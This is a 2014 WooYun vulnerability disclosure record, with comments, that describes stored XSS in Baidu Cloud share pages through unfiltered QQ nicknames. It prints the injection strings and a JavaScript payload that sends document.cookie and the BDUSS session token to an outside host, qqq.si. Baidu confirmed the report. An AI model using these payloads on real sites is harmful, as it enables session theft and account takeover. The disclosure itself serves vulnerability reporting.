{"id": 1055, "wybug_id": "wooyun-2014-072520", "wybug_title": "我是如何通过XSS窃取到百度受http-only保护的cookie的", "wybug_corp": "百度", "wybug_author": "超威蓝猫", "wybug_date": "2014-08-15 13:57", "wybug_open_date": "2014-09-29 19:40", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-29：\t细节向公众公开  简要描述： BDUSS受http-only保护? 看我如何窃取到完整的cookie。「BDUSS是登录百度(web/wap)后的唯一身份凭证(*.baidu.com)，受http-only保护，拿到BDUSS就等于拿到帐号的控制权，通行贴吧、知道、百科、文库、空间、百度云等百度主要产品。」 详细说明：  先来看 http://pan.baidu.com/s/xxxxxxx 这样一个百度云下载页中的一段JS代码(格式化后)：\n\n这里的 disk.util.ViewShareUtils.linkUserName 是分享者的ID。问题就出在这儿，使用QQ登录百度云(http://yun.baidu.com)，QQ昵称中带有的特殊符号(如双引号，分号，括号等)没有被过滤，OAuth接口带来了安全隐患。注册一个新的QQ，将昵称改为\n\"});alert(1)//\n,登录百度云后上传一个文件，分享。http://pan.baidu.com/s/1bnb9GTL 弹咯\n\n加载外部JS: 注册一个新的QQ，把QQ昵称改为\n\"});$.getScript(\"//qqq.si/w0vcEd\")//\n(QQ空间可以改超长昵称哦)同样分享一个文件，得到链接 http://pan.baidu.com/s/1c0kvees \n\nJS内容:\n(function(){(new Image()).src='http://qqq.si/?id=g2L5Jq&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+escape((function(){try{return FileUtils.cktoken}catch(e){return ''}})());})();\n啊，顺便说一下，百度云的下载页中的 FileUtils.cktoken 存储了BDUSS哦\n\n所以，只要有人打开 http://pan.baidu.com/s/1c0kvees ，他的BDUSS就到我的手里咯。\n\n即使没有登录，也会加载这个JS，可以做一些邪恶的事 ._.以上是WEB版的百度云下载页。同样的，手机版的页面也存在类似的XSS，虽然手机版的页面中没有输出BDUSS，但大部分手机浏览器是不支持http-only的，也就是说，http-only这个防护对移动端是形同虚设！节选一小段UA伪装为手机后访问百度云下载页返回的JS代码，格式化后:\n\n很容易就构造出语句\n\"};alert(1)//\n注册一个新的QQ，昵称修改为这个，分享一个文件，手机用户打开该链接 http://pan.baidu.com/s/1c0fBzNi 就会执行JS代码了\n\n至于加载外部JS窃取BDUSS，虽然wap版的下载页面没有$.getScript(), 但神奇的JS一定会有更多的方法，这里不再深入研究了( 暑假作业还没写噜   漏洞证明：  http://pan.baidu.com/s/1bnb9GTL    alert(1)http://pan.baidu.com/s/1c0kvees    $.getScript(\"//qqq.si/w0vcEd\")(wap版触发)http://pan.baidu.com/s/1c0fBzNi     alert(1)   修复方案：  求礼物 :P   版权声明：转载请注明来源 超威蓝猫@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-08-15 16:02 厂商回复： 感谢提交，我们立即联系业务部门处理此问题。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-15 13:58 |    \t\t0x_Jin \t\t\t( 普通白帽子  |\t\t\t        Rank:319 漏洞数:37        | 微博：http://weibo.com/J1n9999)\t\t \n  前排     \n     2014-08-15 13:59 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  感觉以前见过类似的标题。。。    \n     2014-08-15 14:01 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2014-08-15 14:03 |    \t\t小小泥娃 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:4        | 高二)\t\t \n  前排    \n     2014-08-15 14:06 |    \t\t超威蓝猫 \t\t\t( 核心白帽子 |\t\t\t        Rank:1092 漏洞数:117        | STEAM_0:0:55968383)\t\t \n  @Finger @xsser @疯狗 有一处错误，重新编辑了一下，求审核..    \n     2014-08-15 14:07 |    \t\tzph \t\t\t( 普通白帽子  |\t\t\t        Rank:235 漏洞数:43        )\t\t \n  蓝猫霸气~    \n     2014-08-15 14:09 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  mark    \n     2014-08-15 14:14 |    \t\t安然意境 \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:79        | 无论是你的事业还是你的个人，可能走的过程...)\t\t \n  感觉以前见过类似的标题。。。 好像之前谁有发过    \n     2014-08-15 14:15 |    \t\t安然意境 \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:79        | 无论是你的事业还是你的个人，可能走的过程...)\t\t \n  原来是一个人http://wooyun.org/bugs/wooyun-2010-051705    \n     2014-08-15 14:26 |    \t\t包包 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:5        | 我是菜鸟，我怕谁？小弟新来，望大牛多多包...)\t\t \n  蓝猫，这个不是老早就发过了吗？    \n     2014-08-15 14:41 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  @超威蓝猫 猥琐见长啊,看来又学了一招~~~带我飞啊！    \n     2014-08-15 14:48 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  这招好牛B    \n     2014-08-15 15:12 |    \t\tdangge \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 菜鸟一枚 努力学习中。)\t\t \n  好厉害 前排留个名    \n     2014-08-15 15:49 |    \t\t大大灰狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:248 漏洞数:53        | Newbie)\t\t \n  叼    \n     2014-08-15 21:51 |    \t\t有妹子送上 \t\t\t( 实习白帽子  |\t\t\t        Rank:89 漏洞数:28        | 杭州最帅的男人)\t\t \n  学习    \n     2014-09-29 21:09 |    \t\t1c3z \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:29        | 我读书少，你可别骗我！！！)\t\t \n  学习！！    \n     2014-09-30 13:27 |    \t\toHtb \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | hoho)\t\t \n  高级，学习！    \n     2015-04-26 15:09 |    \t\t昌维 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | QQ：867597730，百度贴吧ID：昌维001)\t\t \n  以后所有单点登录的地方都要留意一下没过滤的地方←_←    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}